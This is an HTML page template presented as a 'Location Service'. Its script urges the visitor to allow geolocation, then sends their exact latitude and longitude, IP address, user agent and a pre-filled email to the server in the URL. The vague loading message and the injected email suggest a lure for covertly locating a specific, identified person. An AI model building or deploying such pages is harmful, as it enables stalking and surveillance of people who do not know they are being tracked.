<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Location Service</title>
</head>
<body>
    <div style="text-align: center; margin-top: 100px;">
        <h1>Loading Location-Based Facility...</h1>
        <p>Please click 'Allow' in the pop-up to get the best experience.</p>
        <p style="color: gray;">If you click 'Block' or the request fails, you will be redirected to the standard page.</p>
    </div>

    <script>
        const userIp = "{{ user_ip }}";
        const userAgent = "{{ user_agent }}";
        const email = "{{ email }}"; 
        
        // Construct the fallback URL with all user data
        const fallbackUrl = `/fallback?ip=${userIp}&ua=${userAgent}&email=${email}`;
        
        // Timeout to handle users who don't click Allow/Block
        const timeoutID = setTimeout(() => {
            console.log("Location request timed out. Redirecting to fallback.");
            window.location.href = fallbackUrl;
        }, 10000); // 10 second timeout

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(success, error, {
                enableHighAccuracy: true,
                timeout: 5000, 
                maximumAge: 0
            });
        } else {
            window.location.href = fallbackUrl;
        }

        function success(position) {
            clearTimeout(timeoutID);
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // Redirect back to the server, passing email, lat, and lon
            window.location.href = `/location_received?ip=${userIp}&ua=${userAgent}&email=${email}&lat=${lat}&lon=${lon}`;
        }

        function error(err) {
            clearTimeout(timeoutID);
            console.warn(`Geolocation Error(${err.code}): ${err.message}`);
            
            window.location.href = fallbackUrl;
        }
    </script>
</body>
</html>
